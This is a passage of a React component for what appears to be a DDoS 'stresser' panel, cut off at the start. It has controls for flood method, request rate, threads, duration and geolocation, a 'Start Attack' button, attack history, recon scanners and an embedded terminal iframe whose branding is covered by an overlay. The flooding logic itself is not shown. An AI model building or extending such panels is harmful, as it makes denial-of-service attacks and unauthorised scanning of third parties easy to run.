                      <Label className={currentTheme.text}>Attack Methods</Label>
                      <Select value={attackMethod} onValueChange={setAttackMethod} disabled={isRunning}>
                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          {attackMethods.map((method) => (
                            <SelectItem key={method} value={method}>
                              {method}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>

                    <div>
                      <Label className={currentTheme.text}>HTTP Version</Label>
                      <Select value={httpVersion} onValueChange={setHttpVersion} disabled={isRunning}>
                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="HTTP/1.1">HTTP/1.1</SelectItem>
                          <SelectItem value="HTTP/2">HTTP/2</SelectItem>
                          <SelectItem value="HTTP/3">HTTP/3</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>

                    <div>
                      <Label className={currentTheme.text}>Requests per Second</Label>
                      <Input
                        value={requestsPerSecond}
                        onChange={(e) => setRequestsPerSecond(e.target.value)}
                        placeholder="150"
                        type="number"
                        className={`${currentTheme.secondary} ${currentTheme.text}`}
                        disabled={isRunning}
                      />
                    </div>

                    <div>
                      <Label className={currentTheme.text}>Concurrent Threads</Label>
                      <Input
                        value={concurrents}
                        onChange={(e) => setConcurrents(e.target.value)}
                        placeholder="1"
                        type="number"
                        className={`${currentTheme.secondary} ${currentTheme.text}`}
                        disabled={isRunning}
                      />
                    </div>

                    <div>
                      <Label className={currentTheme.text}>Duration (Seconds)</Label>
                      <Input
                        value={timeInSeconds}
                        onChange={(e) => setTimeInSeconds(e.target.value)}
                        placeholder="60"
                        type="number"
                        className={`${currentTheme.secondary} ${currentTheme.text}`}
                        disabled={isRunning}
                      />
                    </div>

                    {(attackMethod.includes('UDP') || attackMethod.includes('TCP-DATA')) && (
                      <div>
                        <Label className={currentTheme.text}>Packet Size (Bytes)</Label>
                        <Input
                          value={packetSize}
                          onChange={(e) => setPacketSize(e.target.value)}
                          placeholder="1024"
                          type="number"
                          className={`${currentTheme.secondary} ${currentTheme.text}`}
                          disabled={isRunning}
                        />
                      </div>
                    )}

                    <div>
                      <Label className={currentTheme.text}>Geolocation</Label>
                      <Select value={geolocation} onValueChange={setGeolocation} disabled={isRunning}>
                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          {geolocations.map((geo) => (
                            <SelectItem key={geo} value={geo}>
                              {geo}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>

                    {progress > 0 && (
                      <div className="space-y-2">
                        <Label className={currentTheme.text}>Attack Progress</Label>
                        <Progress value={progress} className="w-full" />
                        <span className="text-xs text-gray-500">{Math.round(progress)}%</span>
                      </div>
                    )}

                    <div className="flex space-x-2">
                      <Button
                        onClick={handleStartAttack}
                        disabled={isRunning}
                        className="flex-1 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white"
                      >
                        <Play className="h-4 w-4 mr-1" />
                        Start Attack
                      </Button>
                      
                      <Button
                        onClick={handleStopAttack}
                        disabled={!isRunning}
                        variant="destructive"
                        className="flex-1"
                      >
                        <Square className="h-4 w-4 mr-1" />
                        Stop
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              </div>

              {/* Output Terminal */}
              <div className="lg:col-span-2">
                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl h-full`}>
                  <CardHeader>
                    <div className="flex items-center justify-between">
                      <CardTitle className={currentTheme.text}>Attack Output</CardTitle>
                      <div className="flex space-x-2">
                        <Button
                          onClick={handleDownload}
                          variant="outline"
                          size="sm"
                          className={`${currentTheme.secondary} ${currentTheme.text}`}
                          disabled={!output}
                        >
                          <Download className="h-4 w-4 mr-1" />
                          Download
                        </Button>
                        <Button
                          onClick={handleClear}
                          variant="outline"
                          size="sm"
                          className={`${currentTheme.secondary} ${currentTheme.text}`}
                        >
                          <Trash2 className="h-4 w-4 mr-1" />
                          Clear
                        </Button>
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <Textarea
                      value={output}
                      readOnly
                      className={`min-h-96 font-mono text-sm ${currentTheme.secondary} ${currentTheme.text} resize-none`}
                      placeholder="Attack output will appear here..."
                    />
                  </CardContent>
                </Card>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="history" className="space-y-6">
            <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
              <CardHeader>
                <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
                  <Activity className="h-5 w-5" />
                  Attack History
                </CardTitle>
                <CardDescription className={currentTheme.muted}>
                  Track all your attack sessions and their results
                </CardDescription>
              </CardHeader>
              <CardContent>
                {attackHistory.length === 0 ? (
                  <div className="text-center py-8 text-gray-500">
                    No data available in table
                    <br />
                    <span className="text-sm">Showing no records</span>
                  </div>
                ) : (
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>Target</TableHead>
                        <TableHead>Method</TableHead>
                        <TableHead>Created</TableHead>
                        <TableHead>Expire</TableHead>
                        <TableHead>Status</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {attackHistory.map((attack) => (
                        <TableRow key={attack.id}>
                          <TableCell>{attack.target}</TableCell>
                          <TableCell>{attack.method}</TableCell>
                          <TableCell>{attack.created}</TableCell>
                          <TableCell>{attack.expire}</TableCell>
                          <TableCell>
                            <Badge variant={
                              attack.status === "Running" ? "destructive" :
                              attack.status === "Completed" ? "default" :
                              attack.status === "Failed" ? "destructive" : "secondary"
                            }>
                              {attack.status}
                            </Badge>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="monitor" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                <CardHeader className="pb-2">
                  <CardTitle className={`${currentTheme.text} flex items-center gap-2 text-sm`}>
                    <Cpu className="h-4 w-4" />
                    CPU Usage
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-blue-500">{systemStats.cpu}%</div>
                  <Progress value={systemStats.cpu} className="mt-2" />
                </CardContent>
              </Card>

              <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                <CardHeader className="pb-2">
                  <CardTitle className={`${currentTheme.text} flex items-center gap-2 text-sm`}>
                    <Activity className="h-4 w-4" />
                    Memory
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-green-500">{systemStats.memory}%</div>
                  <Progress value={systemStats.memory} className="mt-2" />
                </CardContent>
              </Card>

              <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                <CardHeader className="pb-2">
                  <CardTitle className={`${currentTheme.text} flex items-center gap-2 text-sm`}>
                    <HardDrive className="h-4 w-4" />
                    Disk Usage
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-orange-500">{systemStats.disk}%</div>
                  <Progress value={systemStats.disk} className="mt-2" />
                </CardContent>
              </Card>

              <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                <CardHeader className="pb-2">
                  <CardTitle className={`${currentTheme.text} flex items-center gap-2 text-sm`}>
                    <Wifi className="h-4 w-4" />
                    Network I/O
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-purple-500">{systemStats.network} MB/s</div>
                  <Progress value={Math.min(systemStats.network / 10, 100)} className="mt-2" />
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          <TabsContent value="recon" className="space-y-6">
            <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
              <CardHeader>
                <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
                  <Shield className="h-5 w-5" />
                  Advanced Reconnaissance Tools
                </CardTitle>
                <CardDescription className={currentTheme.muted}>
                  Comprehensive target analysis and vulnerability assessment
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <Button
                    onClick={() => {
                      setIsRunning(true);
                      const domain = target.replace(/https?:\/\//, '').split('/')[0];
                      performSubdomainEnum(domain).finally(() => setIsRunning(false));
                    }}
                    disabled={!target || isRunning}
                    className="bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white"
                  >
                    <Globe className="h-4 w-4 mr-2" />
                    Subdomain Enum
                  </Button>
                  
                  <Button
                    onClick={() => {
                      setIsRunning(true);
                      performDirectoryEnum(target).finally(() => setIsRunning(false));
                    }}
                    disabled={!target || isRunning}
                    className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white"
                  >
                    <Target className="h-4 w-4 mr-2" />
                    Directory Scan
                  </Button>
                  
                  <Button
                    onClick={() => {
                      setIsRunning(true);
                      const hostname = target.replace(/https?:\/\//, '').split('/')[0];
                      performPortScan(hostname).finally(() => setIsRunning(false));
                    }}
                    disabled={!target || isRunning}
                    className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white"
                  >
                    <AlertTriangle className="h-4 w-4 mr-2" />
                    Port Scan
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="nettools" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <div className="lg:col-span-1">
                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
                  <CardHeader>
                    <CardTitle className={`${currentTheme.text} flex items-center justify-between`}>
                      Network Tools
                      <Server className="h-5 w-5" />
                    </CardTitle>
                    <CardDescription className={currentTheme.muted}>
                      Professional network diagnostic tools
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <Label htmlFor="toolTarget" className={currentTheme.text}>Target Host/Domain</Label>
                      <Input
                        id="toolTarget"
                        value={toolTarget}
                        onChange={(e) => setToolTarget(e.target.value)}
                        placeholder="google.com or 8.8.8.8"
                        className={`${currentTheme.secondary} ${currentTheme.text}`}
                        disabled={isTerminalRunning}
                      />
                    </div>
                    
                    <div>
                      <Label className={currentTheme.text}>Tool Selection</Label>
                      <Select value={selectedTool} onValueChange={setSelectedTool} disabled={isTerminalRunning}>
                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          {networkTools.map((tool) => (
                            <SelectItem key={tool.value} value={tool.value}>
                              <div>
                                <div className="font-medium">{tool.label}</div>
                                <div className="text-xs text-gray-500">{tool.description}</div>
                              </div>
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>

                    <Button
                      onClick={executeSelectedTool}
                      disabled={!toolTarget || isTerminalRunning}
                      className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white"
                    >
                      <Play className="h-4 w-4 mr-2" />
                      Execute Tool
                    </Button>

                    <div className="pt-4 border-t border-gray-700">
                      <h3 className={`text-sm font-medium ${currentTheme.text} mb-2`}>Quick Commands</h3>
                      <div className="grid grid-cols-2 gap-2">
                        <Button
                          onClick={() => executeNetworkTool("ping", "8.8.8.8")}
                          disabled={isTerminalRunning}
                          variant="outline"
                          size="sm"
                          className={`${currentTheme.secondary} ${currentTheme.text} text-xs`}
                        >
                          Ping DNS
                        </Button>
                        <Button
                          onClick={() => executeNetworkTool("traceroute", "google.com")}
                          disabled={isTerminalRunning}
                          variant="outline"
                          size="sm"
                          className={`${currentTheme.secondary} ${currentTheme.text} text-xs`}
                        >
                          Trace Route
                        </Button>
                        <Button
                          onClick={() => executeNetworkTool("nslookup", "google.com")}
                          disabled={isTerminalRunning}
                          variant="outline"
                          size="sm"
                          className={`${currentTheme.secondary} ${currentTheme.text} text-xs`}
                        >
                          DNS Lookup
                        </Button>
                        <Button
                          onClick={() => executeNetworkTool("portscan", "scanme.nmap.org")}
                          disabled={isTerminalRunning}
                          variant="outline"
                          size="sm"
                          className={`${currentTheme.secondary} ${currentTheme.text} text-xs`}
                        >
                          Port Scan
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </div>

              <div className="lg:col-span-2">
                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl h-full`}>
                  <CardHeader>
                    <div className="flex items-center justify-between">
                      <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
                        <Terminal className="h-5 w-5" />
                        Virtual Terminal
                      </CardTitle>
                      <div className="flex space-x-2">
                        <Button
                          onClick={downloadTerminalLog}
                          variant="outline"
                          size="sm"
                          className={`${currentTheme.secondary} ${currentTheme.text}`}
                          disabled={!terminalOutput}
                        >
                          <Download className="h-4 w-4 mr-1" />
                          Save Log
                        </Button>
                        <Button
                          onClick={clearTerminal}
                          variant="outline"
                          size="sm"
                          className={`${currentTheme.secondary} ${currentTheme.text}`}
                        >
                          <Trash2 className="h-4 w-4 mr-1" />
                          Clear
                        </Button>
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className={`bg-black rounded-lg p-4 font-mono text-sm text-green-400 min-h-96 max-h-96 overflow-y-auto`}>
                      <pre className="whitespace-pre-wrap">{terminalOutput}</pre>
                      {isTerminalRunning && (
                        <div className="flex items-center gap-2 mt-2">
                          <div className="animate-spin h-4 w-4 border-2 border-green-400 border-t-transparent rounded-full"></div>
                          <span>Running...</span>
                        </div>
                      )}
                      <div className="flex items-center gap-1 mt-2">
                        <span className="text-green-400">$</span>
                        <Input
                          value={currentCommand}
                          onChange={(e) => setCurrentCommand(e.target.value)}
                          onKeyDown={handleTerminalCommand}
                          className="bg-transparent border-none text-green-400 font-mono text-sm p-0 focus:ring-0 flex-1"
                          placeholder="Type command here..."
                          disabled={isTerminalRunning}
                        />
                      </div>
                    </div>
                    
                    <div className="text-xs text-gray-500">
                      <p>Type 'help' for available commands or use the tool selector above.</p>
                      <p>Examples: ping google.com, traceroute 8.8.8.8, nslookup github.com</p>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="vm" className="space-y-6">
            <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl ${isVmFullscreen ? 'fixed inset-0 z-50 rounded-none' : ''}`}>
              <CardHeader>
                <div className="flex items-center justify-between">
                  <div>
                    <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
                      <Monitor className="h-5 w-5" />
                      Online Virtual Machine
                    </CardTitle>
                    <CardDescription className={currentTheme.muted}>
                      Full-featured Linux and Windows terminal environments running in your browser
                    </CardDescription>
                  </div>
                  <Button
                    onClick={toggleVmFullscreen}
                    variant="outline"
                    size="sm"
                    className={`${currentTheme.secondary} ${currentTheme.text}`}
                  >
                    {isVmFullscreen ? (
                      <>
                        <Minimize className="h-4 w-4 mr-2" />
                        Exit Fullscreen
                      </>
                    ) : (
                      <>
                        <Maximize className="h-4 w-4 mr-2" />
                        Fullscreen
                      </>
                    )}
                  </Button>
                </div>
              </CardHeader>
              <CardContent>
                <div className={`w-full ${isVmFullscreen ? 'h-[calc(100vh-120px)]' : 'h-[600px]'} border border-gray-300 rounded-lg overflow-hidden relative`}>
                  <iframe 
                    src="https://cli.h2.nexus" 
                    width="100%" 
                    height="100%"
                    className="border-0"
                    title="Virtual Machine Terminal"
                  />
                  {/* Precise black overlay to only cover the left side branding with more height */}
                  <div className="absolute bottom-0 left-0 w-1/2 h-12 bg-black"></div>
                </div>
                {!isVmFullscreen && (
                  <div className="mt-4 text-sm text-gray-500">
                    <p>This is a full Linux and Windows environment with access to common tools and utilities.</p>
                    <p>Perfect for testing, development, and learning purposes.</p>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};

export default Panel;
